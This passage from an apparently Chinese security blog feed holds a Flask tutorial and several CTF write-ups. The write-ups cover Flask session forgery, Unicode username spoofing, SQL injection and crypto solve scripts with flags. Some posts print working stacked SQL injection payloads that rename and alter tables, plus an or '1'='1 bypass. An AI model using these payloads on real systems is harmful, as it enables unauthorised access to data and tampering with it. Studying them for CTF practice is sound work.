</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>hello.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   alert(<span class="string">"Hello World"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flask-将表单数据发送到模板"><a href="#Flask-将表单数据发送到模板" class="headerlink" title="Flask 将表单数据发送到模板"></a>Flask 将表单数据发送到模板</h4><p>在以下示例中，<strong>‘/‘ URL</strong>会呈现具有表单的网页（student.html）。填入的数据会发布到触发 <strong>result()</strong>函数的<strong>‘/result’ URL</strong>。</p><p><strong>results()</strong>函数收集字典对象中的<strong>request.form</strong>中存在的表单数据，并将其发送给<strong>result.html</strong>。</p><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line">app = Flask(name)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">student</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'student.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/result',methods = ['POST', 'GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">      result = request.form</span><br><span class="line">      <span class="keyword">return</span> render_template(<span class="string">"result.html"</span>,result = result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> name == <span class="string">'main'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>student.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">"http://localhost:5000/result"</span> <span class="attr">method</span> = <span class="string">"POST"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>Name <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"Name"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>Physics <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"Physics"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>Chemistry <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"chemistry"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>Maths <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"Mathematics"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"submit"</span> <span class="attr">value</span> = <span class="string">"submit"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>result.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span> = <span class="string">1</span>&gt;</span></span><br><span class="line">     &#123;% for key, value in result.items() %&#125;</span><br><span class="line"></span><br><span class="line">    <span class="symbol">&amp;lt;</span>tr<span class="symbol">&amp;gt;</span></span><br><span class="line">       <span class="symbol">&amp;lt;</span>th<span class="symbol">&amp;gt;</span> &#123;&#123; key &#125;&#125; <span class="symbol">&amp;lt;</span>/th<span class="symbol">&amp;gt;</span></span><br><span class="line">       <span class="symbol">&amp;lt;</span>td<span class="symbol">&amp;gt;</span> &#123;&#123; value &#125;&#125; <span class="symbol">&amp;lt;</span>/td<span class="symbol">&amp;gt;</span></span><br><span class="line">    <span class="symbol">&amp;lt;</span>/tr<span class="symbol">&amp;gt;</span></span><br><span class="line"></span><br><span class="line"> &#123;% endfor %&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Flask-Cookies"><a href="#Flask-Cookies" class="headerlink" title="Flask Cookies"></a>Flask Cookies</h3><p>设置cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.set_cookie(key,value[,max_age&#x3D;None,exprise&#x3D;None)]</span><br></pre></td></tr></table></figure><p>获取cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.cookies.get(key)</span><br></pre></td></tr></table></figure><p> 删除cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.delete_cookie(key)</span><br></pre></td></tr></table></figure><p>例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route("/set_cookie")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(<span class="string">"success"</span>)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">        设置cookie,默认有效期是临时cookie,浏览器关闭就失效</span></span><br><span class="line"><span class="string">        可以通过 max_age 设置有效期， 单位是秒</span></span><br><span class="line"><span class="string">    '''</span><span class="string">''</span></span><br><span class="line">    resp.set_cookie(<span class="string">"Itcast_1"</span>, <span class="string">"python_1"</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">"Itcast_2"</span>, <span class="string">"python_2"</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">"Itcast_3"</span>, <span class="string">"python_3"</span>, max_age=<span class="number">3600</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route("/get_cookie")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        获取cookie，通过reques.cookies的方式，</span></span><br><span class="line"><span class="string">        返回的是一个字典，可以用get的方式</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    cookie_1 = request.cookies.get(<span class="string">"Itcast_1"</span>)  <span class="comment"># 获取名字为Itcast_1对应cookie的值</span></span><br><span class="line">    <span class="keyword">return</span> cookie_1</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route("/delete_cookie")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        删除cookie，通过delete_cookie()的方式，</span></span><br><span class="line"><span class="string">        里面是cookie的名字</span></span><br><span class="line"><span class="string">        这里的删除只是让cookie过期，并不是直接删除cookie</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    resp = make_response(<span class="string">"del success"</span>)</span><br><span class="line">    resp.delete_cookie(<span class="string">"Itcast1"</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>参考教程:</p><ol><li><a href="https://www.w3cschool.cn/flask/" target="_blank" rel="noopener">https://www.w3cschool.cn/flask/</a> </li></ol><p>参考文章: </p><ol><li><a href="https://www.cnblogs.com/djflask/p/10460177.html" target="_blank" rel="noopener">https://www.cnblogs.com/djflask/p/10460177.html</a> </li><li><a href="https://blog.csdn.net/wei18791957243/article/details/85172653" target="_blank" rel="noopener">https://blog.csdn.net/wei18791957243/article/details/85172653</a> </li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF-admin</title>
      <link href="/2020/05/05/HCTF-admin/"/>
      <url>/2020/05/05/HCTF-admin/</url>
      
        <content type="html"><![CDATA[<p>参考文献</p><ol><li><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/100733581</a> </li><li><a href="https://www.jianshu.com/p/f92311564ad0" target="_blank" rel="noopener">https://www.jianshu.com/p/f92311564ad0</a> </li><li><a href="https://www.cnblogs.com/chrysanthemum/p/11722351.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11722351.html</a> </li></ol><p>从题目中我们可以找到github源码<a href="https://github.com/woadsl1234/hctf_flask" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask</a></p><p>这里可能需要学习一下flask框架<a href="https://www.w3cschool.cn/flask/" target="_blank" rel="noopener">w3cschool</a></p><p>三种解法</p><h3 id="flask-session-伪造"><a href="#flask-session-伪造" class="headerlink" title="flask session 伪造"></a>flask session 伪造</h3><p>flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。<br> 具体参考:<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.leavesongs.com%2FPENETRATION%2Fclient-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p><p>SECRET_KEY可以在config.py中获取 —— ckj123</p><p>flask中的session的加密和解密可以在<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a> 这里获取到</p><p>对于原先的session先进行解密，修改name后再次加密，然后修改本地session即可。</p><h3 id="Unicode-欺骗"><a href="#Unicode-欺骗" class="headerlink" title="Unicode 欺骗"></a>Unicode 欺骗</h3><p>观察到函数strlower()在register以及change，login中出现了，而且是针对name的处理。</p><p>strlower实际调用的是nodeprep.prepare函数，而nodeprep是从Twisted模块导入的，在requirements.txt文件中发现<code>Twisted==10.2.0</code>，而官网最新已经到了19.7.0(2019/9)，版本差距很大，应该会存在漏洞。 可以参考<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpaper.tuisec.win%2Fdetail%2Fa9ad1440249d95b" target="_blank" rel="noopener">https://paper.tuisec.win/detail/a9ad1440249d95b</a> </p><p>示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin</span><br></pre></td></tr></table></figure><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>之后再说</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> flask </tag>
            
            <tag> unicode欺骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF-EasySQL</title>
      <link href="/2020/04/27/SUCTF-EasySQL/"/>
      <url>/2020/04/27/SUCTF-EasySQL/</url>
      
        <content type="html"><![CDATA[<p>堆叠注入</p><p>分析后端语句 </p><p>由于输入1有回显，0无回显，所以可能存在||的操作，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知，需要注意的是，此时的||起到的作用是or的作用。 </p><p>解法1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><p>此时sql语句变为<code>$select *,1||flag from Flag</code></p><p>解法2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;pipes_as_concat;select 1</span><br></pre></td></tr></table></figure><p>其中set sql_mode=pipes_as_concat;的作用为将||的作用由or变为拼接字符串 ，因此能将前一个字段的查询结果和后一个字段查询结果进行拼接 </p><p><img src="/2020/04/27/SUCTF-EasySQL/SUCTF-easysql.png" alt="运行截图"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安恒4月赛-从not_RSA了解Paillier加密算法</title>
      <link href="/2020/04/27/%E5%AE%89%E6%81%924%E6%9C%88%E8%B5%9B-%E4%BB%8Enot_RSA%E4%BA%86%E8%A7%A3Paillier%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
      <url>/2020/04/27/%E5%AE%89%E6%81%924%E6%9C%88%E8%B5%9B-%E4%BB%8Enot_RSA%E4%BA%86%E8%A7%A3Paillier%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>首先了解一下<a href="https://blog.csdn.net/qq_26816591/article/details/82944696" target="_blank" rel="noopener">Paillier加密算法</a>，也是同态加密算法的一种</p><ol><li>选取大素数p，q （p，q相近）</li><li>n=p*q，λ = (p-1)*(q-1)</li><li>随机数g</li><li>PK=(n, g) , SK=λ</li></ol><p>加密：$C = g^{m} * r^{n}\mod n^{2}$, 其中r为随机数(1,n)</p><p>解密：$m=L(C^{λ}\mod n^{2})/L(g^{λ}\mod n^{2})\mod n$，其中L(x) = (x-1)/n</p><p>原题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime <span class="keyword">as</span> getprime ,long_to_bytes,bytes_to_long,inverse</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,p,q</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime,nextprime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">n=p*q</span><br><span class="line">g=n+<span class="number">1</span></span><br><span class="line">r=random.randint(<span class="number">1</span>,n)</span><br><span class="line"></span><br><span class="line">c=(pow(g,m,n*n)*pow(r,n,n*n))%(n*n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"c=%d"</span>%(c)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"n=%d"</span>%(n)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">c=29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class="line"><span class="string">n=6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>解法：利用yafu分解n得到p，q</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯-随便注</title>
      <link href="/2020/04/25/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
      <url>/2020/04/25/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<p>首先判断一下有无注入：输入1’发现不回显，然后1’ #显示正常，应该是存在sql注入了 </p><p>过滤了<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p>尝试堆叠注入 <code>?inject=1&#39;;show databases;%23</code></p><p>查看所有的表 <code>?inject=1&#39;;show tables;%23</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;show columns from &#96;1919810931114514&#96;;%23</span><br></pre></td></tr></table></figure><p>发现flag在这张表中</p><p>既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为 words1，再把数字表改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?inject&#x3D;1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</span><br></pre></td></tr></table></figure><p>最后<code>/?inject=1&#39; or &#39;1&#39;=&#39;1</code>获取flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020数字中国虎符CTF之GM&amp;McEliece</title>
      <link href="/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF%E4%B9%8BGM&amp;McEliece/"/>
      <url>/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF%E4%B9%8BGM&amp;McEliece/</url>
      
        <content type="html"><![CDATA[<h3 id="GM"><a href="#GM" class="headerlink" title="GM"></a>GM</h3><p>根据<code>pow(q ** 2 * x, (p-1)/2, p) + pow(p ** 2 * x, (q-1)/2, q) == N - phi - 1</code>可以得出<code>pow(x, (p-1)/2, p) == -1</code>。同时<code>(pow(x, int(br + bi, 2), N) * r ** 2) % N</code>等价于$x^{br\ast2+bi}\ast r^2\mod N$, 将其记为$a$，然后我们尝试计算一下$a^{(p-1)/2}\mod p$。我们把$a$代入化简，得到$x^{br\ast2\ast(p-1)/2}\ast x^{bi\ast(p-1)/2}\ast r^{2\ast(p-1)/2}\mod p$，由于第一项和第三项的结果一定为1，因此，当$bi=1$时，整个式子的结果为-1，$bi=0$时整个式子的结果为1。据此，我们可以判断某一位是0还是1。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author: zraxx</span></span><br><span class="line"><span class="comment">#date: 2020-4-19</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"output"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">f = f.readlines()</span><br><span class="line"></span><br><span class="line">phin = int(f[<span class="number">0</span>].strip())</span><br><span class="line">n = int(f[<span class="number">1</span>].strip())</span><br><span class="line">enc = eval(f[<span class="number">2</span>].strip())</span><br><span class="line"></span><br><span class="line">a = n-phin+<span class="number">1</span></span><br><span class="line"><span class="comment"># print iroot(a**2-4*n, 2)</span></span><br><span class="line">p = (a+iroot(a**<span class="number">2</span><span class="number">-4</span>*n, <span class="number">2</span>)[<span class="number">0</span>])//<span class="number">2</span></span><br><span class="line"><span class="keyword">assert</span> n%p==<span class="number">0</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> enc:</span><br><span class="line"><span class="keyword">if</span> pow(x, (p<span class="number">-1</span>)//<span class="number">2</span>, p) == <span class="number">1</span>:</span><br><span class="line">res = res + <span class="string">'0'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res = res + <span class="string">'1'</span></span><br><span class="line"></span><br><span class="line">print(long_to_bytes(int(res,<span class="number">2</span>)))</span><br></pre></td></tr></table></figure><p><strong>FLAG: flag{bd4f1790-f4a2-4904-b4d2-8db8b24fd864}</strong></p><h3 id="McEliece"><a href="#McEliece" class="headerlink" title="McEliece"></a>McEliece</h3><p>根据pubkey可以得出，加密时plain长为28bit，结果为64bit，错误码中6位为1。由于flag中的字符类型有限，可以直接爆破，计算的结果$uG’$和题目给出的加密的结果$uG’+e$应该满足海明距离小于等于6。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author: zraxx</span></span><br><span class="line"><span class="comment">#date: 2020-4-19</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">pubkey=load(<span class="string">"./pubkey.sobj"</span>)</span><br><span class="line">cipher=load(<span class="string">"./cipher.sobj"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(plain)</span>:</span></span><br><span class="line"><span class="keyword">return</span> plain*pubkey</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">same</span><span class="params">(a, b)</span>:</span></span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(a.ncols()):</span><br><span class="line"><span class="keyword">if</span> a[<span class="number">0</span>,i] == b[<span class="number">0</span>,i]:</span><br><span class="line">sum += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> sum</span><br><span class="line"></span><br><span class="line">l = <span class="number">28</span></span><br><span class="line">t = <span class="string">"0123456789abcdef-&#125;"</span></span><br><span class="line">len = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">"flag&#123;c9"</span></span><br><span class="line">prev_cand=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> len&lt;<span class="number">12</span>:</span><br><span class="line"><span class="keyword">print</span> len</span><br><span class="line">cand = <span class="string">""</span></span><br><span class="line">iter = product(t, repeat=<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> iter:</span><br><span class="line">tmp = flag+<span class="string">""</span>.join(x)</span><br><span class="line">bin = BinaryStrings()</span><br><span class="line">msg = map(int ,str(bin.encoding(tmp)))</span><br><span class="line">plain = matrix(GF(<span class="number">2</span>),<span class="number">1</span>,l)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(l):</span><br><span class="line">plain[<span class="number">0</span>,j] = msg[l*len+j]</span><br><span class="line"><span class="keyword">if</span> same(cipher[len], encrypt(plain))&gt;=(<span class="number">64</span><span class="number">-6</span>):</span><br><span class="line"><span class="keyword">if</span> len%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">prev_cand.append(x[<span class="number">3</span>])</span><br><span class="line">cand = x</span><br><span class="line"><span class="keyword">print</span> <span class="string">""</span>.join(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> x[<span class="number">0</span>] <span class="keyword">in</span> prev_cand:</span><br><span class="line">flag += <span class="string">""</span>.join(x)</span><br><span class="line">prev_cand = []</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> len%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">flag+=<span class="string">""</span>.join(cand[:<span class="number">3</span>])</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line">len += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;c941a3cc-85e3-4401-a0f1-764206e71bf3&#125;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG: flag{c941a3cc-85e3-4401-a0f1-764206e71bf3}</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Hook技术介绍</title>
      <link href="/2020/04/18/Linux-Hook%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/"/>
      <url>/2020/04/18/Linux-Hook%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/</url>
      
